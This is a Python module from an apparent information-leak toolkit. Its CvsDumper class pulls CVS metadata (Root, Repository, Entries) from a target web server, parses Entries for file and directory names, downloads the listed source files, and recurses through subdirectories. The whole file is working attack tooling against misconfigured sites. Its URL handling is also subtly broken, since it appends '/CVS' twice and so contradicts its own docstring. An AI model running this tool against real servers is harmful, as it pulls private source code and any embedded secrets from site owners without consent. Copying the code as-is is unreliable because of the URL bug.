"""CVS information leak exploiter."""

import asyncio
import logging
import os
from urllib.parse import urljoin

from rich.console import Console

from fileleak.core.base import BaseDumper

logger = logging.getLogger(__name__)
console = Console()


class CvsDumper(BaseDumper):
    """CVS information leak exploiter.

    Downloads the exposed ``CVS/`` directory, parses ``CVS/Entries`` to
    discover tracked files and directories, downloads the source files
    that sit next to the ``CVS/`` directory, and recursively processes
    sub-directories.
    """

    CVS_FILES = [
        "Root", 
        "Repository", 
        "Entries", 
        "Entries.Log",
        "Baseline",
        "Entries.Static",
        "Tag",
        "Options",
        "Checkin.prog",
        "Update.prog",
    ]

    # Maximum recursion depth for nested CVS subdirectories
    MAX_DEPTH = 10

    def __init__(self, url: str, **kwargs):
        super().__init__(url, **kwargs)
        self.base_url = self._normalize_url(url)
        # reg_url is the URL without the CVS/ suffix, used to download
        # actual source files that sit alongside the CVS/ directory.
        self.reg_url = self._strip_cvs(url)

    async def start(self):
        """Download CVS metadata and attempt to recover files."""
        console.print("[bold yellow][CvsDumper][/bold yellow] Starting CVS leak exploitation")

        # 1. Download CVS metadata from the root
        await self._download_cvs_files("")

        # 2. Parse Entries for file list
        files, dirs = await self._parse_entries("")

        # 3. Display info from Root and Repository
        await self._display_info("")

        # 4. Download source files listed in Entries
        await self._download_source_files(files, "")

        # 5. Recurse into subdirectories
        for d in dirs:
            await self._process_subdir(d, "", depth=1)

        stats = self.get_stats()
        console.print(
            f"[bold yellow][CvsDumper][/bold yellow] Done. "
            f"Downloaded: {stats['downloaded']}, "
            f"Failed: {stats['failed']}, "
            f"Skipped: {stats['skipped']}"
        )

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    async def _download_cvs_files(self, subdir: str):
        """Download CVS metadata files (Root, Repository, Entries, Entries.Log).

        Args:
            subdir: relative path from the web root, e.g. "" or "subdir".
        """
        tasks = []
        for name in self.CVS_FILES:
            if subdir:
                url = f"{self.base_url}/{subdir}/CVS/{name}"
                local = f"{subdir}/CVS/{name}"
            else:
                url = f"{self.base_url}/CVS/{name}"
                local = f"CVS/{name}"
            tasks.append(asyncio.ensure_future(self.download(url, local)))
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _parse_entries(self, subdir: str) -> tuple[list[str], list[str]]:
        """Parse CVS/Entries file.

        Entries format::

            /filename/revision/timestamp/options/tagdate
            D/dirname////

        - Lines starting with ``/`` are file entries
        - Lines starting with ``D/`` are directory entries

        Returns:
            A tuple of (file_list, directory_list).
        """
        if subdir:
            entries_path = os.path.join(self.output_dir, subdir, "CVS", "Entries")
        else:
            entries_path = os.path.join(self.output_dir, "CVS", "Entries")

        if not os.path.isfile(entries_path):
            return [], []

        try:
            with open(entries_path, "r", encoding="utf-8", errors="replace") as f:
                content = f.read()
        except OSError as exc:
            logger.warning(f"Failed to read Entries: {exc}")
            return [], []

        files: list[str] = []
        dirs: list[str] = []

        for line in content.splitlines():
            line = line.strip()
            if not line:
                continue
            # Directory entry: D/dirname////
            if line.startswith("D/"):
                parts = line.split("/")
                if len(parts) >= 2 and parts[1]:
                    dirs.append(parts[1])
            # File entry: /filename/revision/timestamp/options/tagdate
            elif line.startswith("/"):
                parts = line.split("/")
                if len(parts) >= 2 and parts[1]:
                    files.append(parts[1])

        logger.debug(f"Entries parsed ({subdir or 'root'}): {len(files)} file(s), {len(dirs)} dir(s)")
        return files, dirs

    async def _download_source_files(self, files: list[str], subdir: str):
        """Download source files listed in Entries.

        Source files sit next to the CVS/ directory, not inside it.

        Args:
            files: list of filenames from Entries.
            subdir: relative path from the web root.
        """
        if not files:
            return

        console.print(
            f"[bold yellow][CvsDumper][/bold yellow] "
            f"Downloading {len(files)} source file(s) from '{subdir or '/'}'..."
        )

        tasks = []
        for filename in files:
            if subdir:
                url = f"{self.reg_url}/{subdir}/{filename}"
                local = f"{subdir}/{filename}"
            else:
                url = f"{self.reg_url}/{filename}"
                local = filename
            tasks.append(asyncio.ensure_future(self.download(url, local)))

        await asyncio.gather(*tasks, return_exceptions=True)

    async def _process_subdir(self, dirname: str, parent: str, depth: int):
        """Recursively process a CVS subdirectory.

        Args:
            dirname: name of the subdirectory.
            parent: parent relative path (may be empty).
            depth: current recursion depth.
        """
        if depth > self.MAX_DEPTH:
            logger.warning(f"Max recursion depth reached, skipping: {dirname}")
            return

        subdir = f"{parent}/{dirname}" if parent else dirname
        console.print(f"[bold yellow][CvsDumper][/bold yellow] Processing subdirectory: {subdir}")

        # Download CVS metadata for this subdirectory
        await self._download_cvs_files(subdir)

        # Parse Entries
        files, dirs = await self._parse_entries(subdir)

        # Download source files
        await self._download_source_files(files, subdir)

        # Recurse into nested subdirectories
        for d in dirs:
            await self._process_subdir(d, subdir, depth + 1)

    async def _display_info(self, subdir: str):
        """Display CVS root and repository info from downloaded metadata."""
        if subdir:
            root_path = os.path.join(self.output_dir, subdir, "CVS", "Root")
            repo_path = os.path.join(self.output_dir, subdir, "CVS", "Repository")
        else:
            root_path = os.path.join(self.output_dir, "CVS", "Root")
            repo_path = os.path.join(self.output_dir, "CVS", "Repository")

        if os.path.isfile(root_path):
            try:
                with open(root_path, "r", encoding="utf-8", errors="replace") as f:
                    root = f.read().strip()
                console.print(f"  [dim]CVSROOT=[/dim]{root}")
            except OSError:
                pass

        if os.path.isfile(repo_path):
            try:
                with open(repo_path, "r", encoding="utf-8", errors="replace") as f:
                    repo = f.read().strip()
                console.print(f"  [dim]Repository=[/dim]{repo}")
            except OSError:
                pass

    # ------------------------------------------------------------------
    # URL normalization
    # ------------------------------------------------------------------

    @staticmethod
    def _normalize_url(url: str) -> str:
        """Ensure the URL points to the ``CVS`` directory context.

        Returns the URL *with* the ``/CVS`` suffix so that metadata
        files can be addressed as ``<base_url>/Root`` etc.
        """
        url = url.rstrip("/")
        if url.endswith("/CVS"):
            return url
        return url + "/CVS"

    @staticmethod
    def _strip_cvs(url: str) -> str:
        """Return the URL without the ``/CVS`` suffix.

        Used for downloading actual source files that sit alongside
        the ``CVS/`` directory.
        """
        url = url.rstrip("/")
        if url.endswith("/CVS"):
            return url[:-4]
        return url
